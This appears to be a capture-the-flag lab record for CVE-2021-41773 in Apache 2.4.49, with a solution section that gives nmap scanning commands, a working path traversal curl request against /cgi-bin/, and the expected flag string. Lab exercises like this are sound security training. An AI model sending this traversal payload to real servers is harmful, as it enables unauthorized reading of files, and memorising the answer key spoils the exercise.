{"description":"CVE-2021-41773 exercise of vulnerability in Apache 2.4.49 created by m96dg","goal":"<div class=\"ng-binding\">\n<p>The goal of this lab is to exploit the vulnerability in <strong>Apache 2.4.49</strong>. In order to exploit it, it is necessary to use a \"path traversal attack\" to map files outside the preconfigured folders and create a sort of remote shell.</p>\n<p><br />For the exercise it is convenient to use an ad hoc vulnerable docker present on the docker hub:</p>\n<p><br />Link: <strong>https://hub.docker.com/r/m96dg/pw_apache_2_4_49</strong></p>\n</div>","solution":"<div class=\"large_div ng-binding\">\n<p>During the lab I recommend using <strong>Kali Linux</strong> and its tools.</p>\n<p><br />$docker pull m96dg/pw_apache_2_4_49</p>\n<p><br />$docker run -dit -p 8080:80 m96dg/pw_apache_2_4_49<br /><br /><strong>Scanning Phase</strong> (we try to collect as much information as possible from the host):<br />$nmap -sS -p- -T4 -Pn -oA portScan [IP]<br /><br /><strong>Enumeration Phase</strong> (let's try to learn the information by enumerating the ports found during the scanning phase):<br />$nmap -sV -sC -oA versionScan [IP]<br /><br />To be able to carry out the attack, you need to run this command and try to find the flag (if it is entered in root):<br />$curl http://[IP]:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/flag.txt<br /><br />To be sure that the lab has been successful, and that the flag is actually the one found, compare the string with its decryption in Md5 (\"<strong>HaiTrovatoLaFlag_Apache</strong>\"). If the two strings match, then that's it!</p>\n</div>","readme":"","author":"m96dg"}
